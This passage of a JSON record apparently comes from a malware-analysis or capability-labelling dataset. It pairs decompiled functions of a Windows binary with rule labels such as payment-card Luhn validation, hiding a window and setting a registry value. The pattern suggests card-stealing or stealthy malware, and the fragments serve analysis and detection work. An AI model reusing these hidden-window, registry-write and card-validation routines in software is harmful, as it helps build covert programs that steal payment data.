   *(puVar11 + -1) = in_SS;\n    pcVar5[0xd] = pcVar5[0xd] + (extraout_ECX_04 + 1 >> 8);\n    puVar11[-2] = 0x423614;\n    puVar11[-3] = 0x404e9c;\n    fcn.004038e0(puVar11[-2], puVar11[-1], *puVar11, puVar11[1]);\n    return;\n}\n",
        "token_count": 3783
    },
    "00404eb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nvoid __fastcall fcn.00404eb0(int32_t param_1, char *param_2)\n\n{\n    int32_t *piVar1;\n    char cVar3;\n    int32_t in_EAX;\n    uint uVar2;\n    uint unaff_EBX;\n    ushort unaff_SI;\n    int32_t unaff_EDI;\n    ushort in_SS;\n    uint8_t in_CF;\n    uint8_t in_AF;\n    bool in_ZF;\n    bool in_OF;\n    uint unaff_retaddr;\n    \n    if ((!in_CF && !in_ZF) && (in_CF || in_ZF)) {\n        if (!in_OF) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        if (in_CF || in_ZF) {\n            do {\n                cVar3 = in_EAX >> 8;\n                in_CF = 9 < (in_EAX & 0xf) | in_AF;\n                in_EAX = CONCAT31(CONCAT21(in_EAX >> 0x10, cVar3 - in_CF), -in_CF);\n                in_AF = in_CF;\n            } while (in_CF || cVar3 == *param_2);\n        }\n        piVar1 = unaff_EDI + param_2 * 2;\n        *piVar1 = (*piVar1 + 0x7b) - in_CF;\n        *(param_1 + 0x6a) = in_EAX;\n        *(in_EAX + 8) = *(in_EAX + 8) | param_1 >> 8;\n        param_2[0xd] = param_2[0xd] + (param_1 + 1 >> 8);\n        fcn.004038e0(0x423614, CONCAT22(unaff_SI, in_SS), unaff_EBX, unaff_retaddr);\n        return;\n    }\n    if (*0x42366c == 0) {\n        uVar2 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar2);\n        *0x42366c = 1;\n    }\n    return;\n}\n",
        "token_count": 486
    },
    "00401980": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401980(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 63
    },
    "004026b0": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004026b0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x411610, 0x423660, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 138
    },
    "004023e0": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.004023e0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x411358, 0x41139c, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 79
    }
}